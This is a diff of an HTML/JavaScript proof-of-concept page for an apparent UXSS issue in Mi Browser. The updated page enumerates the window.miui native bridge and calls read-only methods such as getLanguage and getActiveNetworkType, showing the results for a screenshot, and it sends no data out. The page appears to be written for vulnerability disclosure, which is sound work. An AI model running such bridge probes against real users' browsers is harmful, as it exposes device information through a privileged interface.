@@ -1,22 +1,82 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Mi Browser UXSS — getApplicationInfo PoC</title>
-<pre id="out">Starting…</pre>
+<title>Mi Browser UXSS — Safe enum & calls</title>
+<style>
+  body{font-family:system-ui,Roboto,Arial;padding:16px}
+  pre{white-space:pre-wrap;background:#fffafa;padding:12px;border-radius:8px;border:1px solid #eee}
+</style>
+<h3>Mi Browser — window.miui diagnostic (safe)</h3>
+<p>Menjalankan read-only calls saja. Tidak mengirim data ke mana-mana.</p>
+<pre id="out">Starting...</pre>
 <script>
-try {
-  if (typeof window.miui === "object" && typeof window.miui.getApplicationInfo === "function") {
-    var info;
-    try { info = window.miui.getApplicationInfo(); } catch(e) { info = "THREW:"+e; }
-    var s;
-    try { s = JSON.stringify(info); } catch(_) { s = String(info); }
-    document.getElementById('out').textContent = "getApplicationInfo() => " + s;
-    alert("MIUI-POC getApplicationInfo:\\n" + s);
-  } else {
-    document.getElementById('out').textContent = "getApplicationInfo not available";
-    alert("MIUI-POC: getApplicationInfo not available");
+(function(){
+  const out = document.getElementById('out');
+  function log(s){ out.textContent += '\\n' + s; console.log(s); }
+
+  try {
+    if (typeof window.miui !== 'object') {
+      log('window.miui NOT FOUND');
+      alert('MIUI-POC: window.miui NOT FOUND');
+      return;
+    }
+
+    log('window.miui FOUND — enumerating keys...');
+    const keys = [];
+    try {
+      for (let k in window.miui) { keys.push(k); }
+    } catch(e) {
+      log('enumeration threw: ' + e);
+    }
+    log('keys: ' + keys.join(', '));
+
+    // safe candidate methods (read-only / non-destructive)
+    const candidates = [
+      'getLanguage',
+      'getRegion',
+      'isNightModeEnabled',
+      'hasShortcutInLauncher',
+      'isInMultiWindowMode',
+      'isLayoutRtl',
+      'isMainBrowser',
+      'getActiveNetworkTypeName', // may throw on some builds — still try
+      'getActiveNetworkType'
+    ];
+
+    const results = [];
+    candidates.forEach(name => {
+      try {
+        if (typeof window.miui[name] === 'function') {
+          try {
+            const r = window.miui[name]();
+            // try safe stringify fallback
+            let s;
+            try { s = typeof r === 'string' ? r : JSON.stringify(r); } catch(_) { s = String(r); }
+            results.push(name + ' => OK: ' + s);
+            log(name + '() => ' + s);
+          } catch(callErr) {
+            results.push(name + ' => THREW: ' + String(callErr));
+            log(name + '() THREW: ' + callErr);
+          }
+        } else {
+          results.push(name + ' => NOT A FUNCTION / not present');
+          log(name + ' not callable or not present');
+        }
+      } catch(e) {
+        results.push(name + ' => ENUM/CALL ERROR: ' + String(e));
+        log(name + ' enum/call error: ' + e);
+      }
+    });
+
+    log('--- summary ---');
+    results.forEach(r => log(r));
+    // short alert for screenshot (first 200 chars)
+    try {
+      const short = results.join('; ').slice(0,200);
+      alert('MIUI-POC results: ' + short + (results.join('; ').length > 200 ? '...' : ''));
+    } catch(e){}
+  } catch(err){
+    log('TOP ERROR: ' + err);
+    try { alert('MIUI-POC ERROR: ' + err); } catch(e){}
   }
-} catch(e) {
-  document.getElementById('out').textContent = "ERROR: " + e;
-  alert("MIUI-POC ERR: " + e);
-}
+})();
 </script>
